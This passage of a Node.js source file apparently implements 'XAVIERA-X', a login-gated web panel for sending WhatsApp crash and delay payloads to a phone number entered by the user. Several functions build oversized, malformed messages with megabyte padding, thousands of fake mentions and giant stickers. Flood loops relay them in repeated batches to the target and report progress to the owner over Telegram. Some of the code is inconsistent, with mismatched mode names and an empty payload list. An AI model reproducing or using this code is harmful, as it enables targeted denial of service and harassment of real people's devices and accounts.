    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

async function InvisibleStc(sock, target) {
  const msg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
}

async function Atut(target) {
    const OndetMsg1 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "B = BOKEP⟅༑", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_message"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    const OndetMsg2 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "K = KONTOL ᝄ", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message", 
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_request"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741, 
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    await sock.relayMessage("status@broadcast", OndetMsg1.message, {
        messageId: OndetMsg1.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { jid: target } 
                }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", OndetMsg2.message, {
        messageId: OndetMsg2.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { jid: target } 
                }]
            }]
        }]
    });
}

async function yaredelay(sock, target) {
  const Stanza_Id = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: " [ memek ] ", 
            format: "EXTENTION_1" 
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, i) => `1313555020${i + 1}@s.whatsapp.net`),
            statusAttributionType: "SHARED_FROM_MENTION"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "galaxy_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
  })

  await sock.relayMessage("status@broadcast", Stanza_Id.message, {
    messageId: Stanza_Id.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users", 
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  })

  const Stanza_Id2 = generateWAMessageFromContent("status@broadcast", {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "Reza yare", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
  })

  await sock.relayMessage("status@broadcast", Stanza_Id2.message, {
    messageId: Stanza_Id2.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users", 
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  })
}

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./HCS-View/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andro-crash", "andro-delay", "iphone-delay"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=andros-delay atau ?mode=iphone-delay atau ?mode=andro-crash."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

// == TEMPAT PENGIRIMAN BUG == \\
// sesuaiin aja ama pemanggilan func tadi / combo
    try {
      if (mode === "andros-delay") {
        androdelay(24, target);

      } else if (mode === "iphone-delay") {
        iphondelay(24, target);

      } else if (mode === "andro-crash") {
        androcrash(24, target);

      } else {
        throw new Error("Mode tidak dikenal.");
      }
      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(port, async () => {
  logToTelegram(`🚀 Server aktif di ${domain}:${port}`);
});
// ==================== EXPORTS ==================== //
module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// ==================== FLOOD FUNCTIONS ==================== //

/* ===== Andro Delay ===== */
async function androdelay(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  await bot.telegram.sendMessage(OWNER_ID, `🚀 *Execution Started*
Mode: *Duration Delay*
Target: ${target}
Time: ${new Date().toLocaleString("id-ID")}
`, { parse_mode: "Markdown" });

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      await bot.telegram.sendMessage(OWNER_ID, `✅ Finished Duration Delay— Total batch: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          DelayUi(target),
          ProtoVidzfreeze(target, true),
          InvisibleStc(sock, target),
          Atut(target),
          yaredelay(sock, target)
        ]);

        count++;
        await bot.telegram.sendMessage(OWNER_ID, `💥 — ${count}/400 Crash sends — Target: ${target}`);
        setTimeout(sendNext, 2000);
      } else {
        await bot.telegram.sendMessage(OWNER_ID, `✅ Batch ${batch} done (Andro Delay) — Target: ${target}`)
        if (batch < maxBatches) {
          count = 0;
          batch++;
          await bot.telegram.sendMessage(OWNER_ID, `⏳ — Waiting 5s before next batch...`);
          setTimeout(sendNext, 5000);
        } else {
          await bot.telegram.sendMessage(OWNER_ID, `💙 All done (Androdelay) — ${maxBatches} batches`);
        }
      }
    } catch (err) {
      await bot.telegram.sendMessage(OWNER_ID, `❌ Error (Androdelay) for ${target} — : ${err?.message || err}`);
      setTimeout(sendNext, 2000);
    }
  };

  sendNext();
}
/* ===== Andro Crash ===== */
async function androcrash(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  await bot.telegram.sendMessage(OWNER_ID, `🚀 *Execution Started*
Mode: *Andro Crash*
Target: ${target}
Time: ${new Date().toLocaleString("id-ID")}
`, { parse_mode: "Markdown" });

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      await bot.telegram.sendMessage(OWNER_ID, `✅ Finished AndroCrash — Total batch: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([

        ]);

        count++;
        await bot.telegram.sendMessage(OWNER_ID, `💥 — ${count}/400 Crash sends — Target: ${target}`);
        setTimeout(sendNext, 2000);
      } else {
        await bot.telegram.sendMessage(OWNER_ID, `✅ Batch ${batch} done (AndroCrash) — Target: ${target}`);
        if (batch < maxBatches) {
          count = 0;
          batch++;
          await bot.telegram.sendMessage(OWNER_ID, `⏳ — Waiting 5s before next batch...`);
          setTimeout(sendNext, 5000);
        } else {
          await bot.telegram.sendMessage(OWNER_ID, `💙 All done (AndroCrash) — ${maxBatches} batches`);
        }
      }
    } catch (err) {
      await bot.telegram.sendMessage(OWNER_ID, `❌ Error (AndroCrash) for ${target} — : ${err?.message || err}`);
      setTimeout(sendNext, 2000);
    }
  };

  sendNext();
}
/* ===== iPhone Invis ===== */
async function iphonedelay(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  await bot.telegram.sendMessage(OWNER_ID, `🚀 *Execution Started*
Mode: *Ipong Invis*
Target: ${target}
Time: ${new Date().toLocaleString("id-ID")}
`, { parse_mode: "Markdown" });

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      await bot.telegram.sendMessage(OWNER_ID, `✅ Finished IpongInvis — Total batch: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          gsInter(target, true),
          gsInterx2(sock, target)
        ]);

        count++;
        await bot.telegram.sendMessage(OWNER_ID, `👻 — ${count}/400 IpongInvis — Target: ${target}`);
        setTimeout(sendNext, 2000);
      } else {
        await bot.telegram.sendMessage(OWNER_ID, `✅ Batch ${batch} done (IpongInvis) —`);
        if (batch < maxBatches) {
          count = 0;
          batch++;
          await bot.telegram.sendMessage(OWNER_ID, `⏳— Waiting 5s before next IpongInvis batch...`);
          setTimeout(sendNext, 5000);
        } else {
          await bot.telegram.sendMessage(OWNER_ID, `💙 All done (IpongInvis) — ${maxBatches} batches`);
        }
      }
    } catch (err) {
      await bot.telegram.sendMessage(OWNER_ID, `❌ Error (IpongInvis) — ${err?.message || err}`);
      setTimeout(sendNext, 2000);
    }
  };

  sendNext();
}
// ==================== HTML TEMPLATE ==================== //
app.get("/info", (req, res) => {
  const sessionUser = req.cookies.sessionUser; // ambil username dari cookie
  const users = getUsers();

  const userInfo = users.find(u => u.username === sessionUser);

  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  res.send(`<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>XAVIERA-X — Info</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    :root{
      --bg:#000;
      --white:#fff;
      --muted:#a6a6a6;
      --panel:#0b0b0b;
      --accent-border: rgba(255,255,255,0.06);
    }
    *{box-sizing:border-box;margin:0;padding:0}
    html, body {height:100%;}
    body {
      font-family:Poppins,sans-serif;
      background: var(--bg);
      color: var(--white);
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      margin: 0;
      padding: 18px;
      justify-content: flex-start;
      align-items: center;
    }
    .app {
      width: 100%;
      max-width: 420px;
      border-radius: 18px;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      background: linear-gradient(180deg,#050505,#070707);
      box-shadow: 0 18px 60px rgba(0,0,0,0.65);
      border: 1px solid rgba(255,255,255,0.03);
      padding: 20px;
      gap: 16px;
      flex: 1;
    }
    .logo-img {
      width: 200px;
      height: 140px;
      border-radius: 18px;
      object-fit: cover;
      background: #070707;
      border: 1px solid var(--accent-border);
      margin-bottom: 12px;
      align-self: center;
    }
    .card {
      width: 100%;
      border: 1px solid var(--accent-border);
      border-radius: 14px;
      padding: 18px;
      background: var(--panel);
      display: flex;
      flex-direction: column;
      gap: 8px;
    }
    .card h3 {
      margin-bottom: 6px;
      font-family: Orbitron,sans-serif;
      font-size: 16px;
      text-align: center;
    }
    .card p {
      font-size: 14px;
      color: var(--muted);
      margin: 0;
      text-align: center;
    }
    .video-container {
  width: 100%;
  border-radius: 12px;
  overflow: hidden;
  border: 1px solid var(--accent-border);
  margin-top: 12px;
}

.video-container video {
  width: 100%;
  height: auto;
  display: block;
  border-radius: 12px;
  object-fit: cover;
}
    .bottom-nav {
      width: 100%;
      display: flex;
      justify-content: space-around;
      background: var(--panel);
      border-top: 1px solid var(--accent-border);
      padding: 10px 0;
      border-radius: 12px 12px 0 0;
      margin-top: auto;
      position: relative;
      bottom: auto;
    }
    .bottom-nav button {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 4px;
      background: none;
      border: none;
      color: var(--muted);
      font-size: 12px;
      cursor: pointer;
    }
    .bottom-nav button i {
      font-size: 18px;
    }
    .bottom-nav button.active,
    .bottom-nav button:hover {
      color: var(--white);
    }
  </style>
</head>
<body>
  <div class="app">
    <img class="logo-img" src="https://files.catbox.moe/ank7my.jpg" alt="logo">

    <div class="card">
      <h3>User Info</h3>
      <p><i class="fas fa-user"></i> User: ${username}</p>
      <p><i class="fas fa-clock"></i> Exp: ${formattedTime}</p>
    </div>

   <div class="video-container">
<video src="https://files.catbox.moe/gkchfw.mp4" autoplay loop muted preload="auto"></video>
</div>

    <div class="bottom-nav">
      <button class="active"><i class="fas fa-user"></i><span> INFO</span></button>
      <button onclick="window.location.href='/execution'"><i class="fab fa-whatsapp"></i><span> TOLS</span></button>
      <button onclick="window.location.href='/logout'"><i class="fas fa-sign-out-alt"></i><span> LOGOUT</span></button>
    </div>
  </div>
</body>
</html>`);
});

const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>XAVIERA-X — Dashboard</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">

  <style>
    :root{
      --bg:#000;
      --white:#fff;
      --muted:#a6a6a6;
      --panel:#0b0b0b;
      --accent-border: rgba(255,255,255,0.06);
    }
    *{box-sizing:border-box;margin:0;padding:0}
    html,body{height:100%}
    body{
      font-family: Poppins, sans-serif;
      background: linear-gradient(180deg,#000 0%,#050505 100%);
      color:var(--white);
      display:flex;
      align-items:center;
      justify-content:center;
      padding:18px;
    }

    /* ========================= SPLASH SCREEN ========================= */
    #splash {
      position: fixed;
      inset: 0;
      background: #000;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 25px;
      z-index: 9999;
      animation: fadeOut 1s ease forwards;
      animation-delay: 2.7s;
    }

    .poly-wrap {
      width: 95px;
      height: 95px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .poly {
      width: 70px;
      height: 70px;
      border: 4px solid #9f8bff;
      clip-path: polygon(
        50% 0%, 90% 20%, 100% 60%,
        75% 100%, 25% 100%, 0% 60%, 10% 20%
      );
      animation: spin 2s linear infinite;
    }

    .title {
      font-size: 26px;
      font-weight: 600;
      letter-spacing: 4px;
      color: #ddd;
      font-family: Orbitron;
      animation: fadeText 1.2s ease;
    }

    .circle-loader {
      width: 65px;
      height: 65px;
      border: 4px solid #444;
      border-top-color: #b39cff;
      border-radius: 50%;
      animation: spin 1.4s linear infinite;
    }

    .bar-loader {
      width: 210px;
      height: 5px;
      background: #222;
      border-radius: 10px;
      overflow: hidden;
    }
    .bar {
      width: 0%;
      height: 100%;
      background: linear-gradient(90deg, #a688ff, #ffffff);
      animation: loadbar 2.8s ease forwards;
    }

    .dots {
      display: flex;
      gap: 9px;
    }
    .dots span {
      width: 10px;
      height: 10px;
      background: #9f8bff;
      border-radius: 50%;
      opacity: 0.4;
      animation: dotAnim 0.9s infinite alternate;
    }
    .dots span:nth-child(2) { animation-delay: .2s }
    .dots span:nth-child(3) { animation-delay: .4s }

    @keyframes spin { to { transform: rotate(360deg); } }
    @keyframes fadeText {
      from { opacity: 0; transform: translateY(10px); }
      to   { opacity: 1; transform: translateY(0); }
    }
    @keyframes loadbar {
      from { width: 0% }
      to   { width: 100% }
    }
    @keyframes dotAnim {
      from { transform: translateY(0); opacity: .4 }
      to   { transform: translateY(-6px); opacity: 1 }
    }
    @keyframes fadeOut {
      to { opacity: 0; visibility: hidden }
    }

    /* ========================= APP STYLE ========================= */
    .app {
      width:100%;
      max-width:420px;
      height:92vh;
      border-radius:18px;
      overflow:hidden;
      display:flex;
      flex-direction:column;
      background: linear-gradient(180deg,#050505, #070707);
      box-shadow: 0 18px 60px rgba(0,0,0,0.65);
      border: 1px solid rgba(255,255,255,0.03);
    }

    .img { width:250px;height:160px;border-radius:10px;object-fit:cover;background:#070707;border:1px solid var(--accent-border); }
    .main { flex:1;display:flex;flex-direction:column;align-items:stretch;justify-content:center;padding:22px;gap:16px; }
    .headline { text-align:center; }
    .headline h2 { margin-bottom:6px;font-family:Orbitron, sans-serif;font-size:20px; }
    .headline p { color:var(--muted); font-size:13px; margin:0; }

    .form { width:100%;display:flex;flex-direction:column;gap:12px;align-items:stretch;margin-top:6px; }
    .field { position:relative; }
    .field i{ position:absolute; left:14px; top:50%; transform:translateY(-50%); color:var(--muted); }

    input[type="text"], select {
      width:100%;
      padding:14px 16px 14px 44px;
      border-radius:12px;
      background:var(--panel);
      border:1px solid var(--accent-border);
      color:var(--white);
      outline:none;
      font-size:15px;
      transition: box-shadow .18s, border-color .18s;
      text-align:center;
    }
    input::placeholder { color: rgba(255,255,255,0.34); }
    input:focus, select:focus {
      box-shadow:0 10px 30px rgba(255,255,255,0.02);
      border-color: rgba(255,255,255,0.12);
    }

    .cta {
      margin-top:6px;
      padding:16px;
      border-radius:14px;
      background:var(--white);
      color:#000;
      font-weight:800;
      font-size:16px;
      border:none;
      cursor:pointer;
      transition: transform .12s ease;
    }

    .cta:active { transform:scale(.99); }
    .cta[disabled] { opacity:.5; cursor:not-allowed; transform:none; }

    .bottom-nav{width:100%;display:flex;justify-content:space-around;background:var(--panel);border-top:1px solid var(--accent-border);padding:10px 0;border-radius:12px 12px 0 0;margin-top:auto;position:sticky;bottom:0;}
    .bottom-nav button{display:flex;flex-direction:column;align-items:center;gap:4px;background:none;border:none;color:var(--muted);font-size:12px;cursor:pointer;}
    .bottom-nav button i{font-size:18px;}
    .bottom-nav button.active,.bottom-nav button:hover{color:var(--white);}

    .toast {
      position:fixed; left:50%; transform:translateX(-50%);
      bottom:22px;
      background:rgba(255,255,255,0.06);
      color:var(--white);
      padding:10px 16px;
      border-radius:12px;
      border:1px solid rgba(255,255,255,0.06);
      display:flex; gap:10px; align-items:center;
      box-shadow:0 12px 40px rgba(0,0,0,0.6);
      z-index:60;
      backdrop-filter: blur(6px);
      opacity:0;
      transition: opacity .4s ease;
    }
    .loader {
      width:18px;height:18px;border-radius:50%;
      border:2px solid rgba(255,255,255,0.12);
      border-top-color:var(--white);
      animation:spin .8s linear infinite;
    }

    @keyframes spin{ to{transform:rotate(360deg);} }
  </style>
</head>

<body>

  <!-- ================= SPLASH INTRO ================= -->
  <div id="splash">
    <div class="poly-wrap"><div class="poly"></div></div>
    <h1 class="title">XAVIERA-X</h1>
    <div class="circle-loader"></div>
    <div class="bar-loader"><div class="bar"></div></div>
    <div class="dots"><span></span><span></span><span></span></div>
  </div>

  <!-- ================= MAIN APP ================= -->
  <div class="app">
    <div class="main">
      ${isForm ? `
      <div class="headline">
        <img class="img" src="https://files.catbox.moe/ank7my.jpg" alt="img">
        <h2>XAVIERA-X</h2>
      </div>

      <form id="panelForm" class="form" onsubmit="return false;">
        <div class="field">
          <i class="fas fa-phone"></i>
          <input id="target" type="text" placeholder="target input (62...)" inputmode="numeric" autocomplete="off" />
        </div>
        <div class="field">
          <i class="fas fa-bug"></i>
          <select id="mode">
            <option value="">Pilih mode</option>
            <option value="andros-crash">CRASH ANDROID</option>
            <option value="andros-delay">DELAY ANDRO</option>
            <option value="iphone-delay">DELAY IPHONE</option>
          </select>
        </div>
        <button id="sendBtn" class="cta" type="button">➤ SEND BUG</button>
      </form>
      ` : `
      <div class="headline">
        <h2>${status}</h2>
      </div>
      <div class="details" style="text-align:center; color:var(--muted); font-size:14px;"></div>
      `}
    </div>

    <div class="bottom-nav">
      <button onclick="window.location.href='/info'"><i class="fas fa-user"></i><span> INFO</span></button>
      <button class="active"><i class="fab fa-whatsapp"></i><span> TOLS</span></button>
      <button onclick="window.location.href='/logout'"><i class="fas fa-sign-out-alt"></i><span> LOGOUT</span></button>
    </div>
  </div>

  <div id="toast" class="toast" style="display:none;">
    <div id="loader" class="loader" style="display:none"></div>
    <div id="toastText">Simulasi: menunggu...</div>
  </div>

  ${isForm ? `
  <script>
    const sendBtn = document.getElementById('sendBtn');
    const targetInput = document.getElementById('target');
    const modeSelect = document.getElementById('mode');
    const toast = document.getElementById('toast');
    const loader = document.getElementById('loader');
    const toastText = document.getElementById('toastText');

    function isValidNumber(number) {
      return /^62\\d{7,13}$/.test(number);
    }

    function showToast(message, showLoader = false) {
      toastText.textContent = message;
      loader.style.display = showLoader ? 'inline-block' : 'none';
      toast.style.display = 'flex';
      setTimeout(() => { toast.style.opacity = '1'; }, 50);
      setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => { toast.style.display = 'none'; }, 400);
      }, 3000);
    }

    sendBtn.addEventListener('click', () => {
      const number = targetInput.value.trim();
      const mode = modeSelect.value.trim();

      if (!number || !isValidNumber(number)) {
        showToast("Nomor tidak valid! Gunakan format 62xxxxxxxxxx");
        return;
      }
      if (!mode) {
        showToast("Pilih mode terlebih dahulu!");
        return;
      }

      showToast("Mengirim bug...", true);

      setTimeout(() => {
        showToast(\`Success: \${mode.toUpperCase()} dikirim ke \${number}\`);
        setTimeout(() => {
          window.location.href = '/execution?mode=' + mode + '&target=' + number;
        }, 1000);
      }, 1600);
    });

    // AUTO HILANG SPLASH
    setTimeout(() => {
      document.getElementById("splash").style.display = "none";
    }, 3000);
  </script>
  ` : ''}
</body>
</html>
`;
};